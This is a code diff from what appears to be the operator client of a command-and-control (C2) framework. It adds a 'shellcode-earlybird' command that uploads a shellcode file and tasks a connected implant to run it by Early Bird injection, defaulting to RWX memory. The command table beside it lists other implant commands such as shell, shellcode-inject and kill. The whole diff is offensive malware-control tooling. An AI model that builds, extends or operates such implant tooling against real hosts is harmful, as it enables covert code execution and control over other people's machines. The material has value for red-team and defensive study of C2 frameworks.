@@ -236,6 +236,45 @@ def cmd_shellcode_spawn(args: List[str], app):
     print_success(cmd_id=cmd_id, args=args, app=app)
     return
 
+def cmd_shellcode_earlybird(args: List[str], app):
+    # Must be 2 args
+    client_errors.arg_len_error(args, max=3, min=2)
+
+    if len(args) == 3:
+        if args[2] != "RX" and args[2] != "RWX":
+            raise client_errors.CommandDoesntExist
+
+    # Error if not connected to implant
+    if not connected_to_implant():
+        raise client_errors.NotConnectedToImplant
+
+    # Create a file id for the file to be saved
+    file_id = encryption.id_generator(N=32)
+
+    # Create a command id
+    cmd_id = encryption.id_generator(N=32)
+
+    # Create the command string
+    # If no specification of memory protection, default to RWX
+    if len(args) == 2:
+        cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_EARLYBIRD, [file_id, "RWX"]) 
+    else:
+        cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_EARLYBIRD, [file_id, args[2]]) 
+
+    # Post the file, if it doesn't exist, will raise FileDoesntExist exception
+    uploaded_filename = post_file_command(file_path=args[1],
+                                          file_id=file_id,
+                                          cmd_id=cmd_id,
+                                          cmd_type=storage.CMD_TYPE.CMD_SHELLCODE_EARLYBIRD,
+                                          cmd_str=cmd_str
+                                          )
+    
+    # Check for server error on the return, raise a UploadFailure
+    if uploaded_filename == server_codes.ServerErrors.ERR_UPLOAD_EXCEPTION.value:
+        raise client_errors.UploadFailure 
+    
+    print_success(cmd_id=cmd_id, args=args, app=app)
+    return
 # Associated commands with kill
 def cmd_kill_implant(args: List[str], app):
     # Check for the length of args and raise appropriate exception
@@ -358,6 +397,7 @@ CMD_TABLE = {
                 "shell": cmd_shell,
                 "shellcode-inject": cmd_shellcode_inject,
                 "shellcode-spawn": cmd_shellcode_spawn,
+                "shellcode-earlybird": cmd_shellcode_earlybird,
                 "kill": cmd_kill_implant,
                 "!": cmd_terminal_passthrough,
                 "nickname": cmd_nickname,
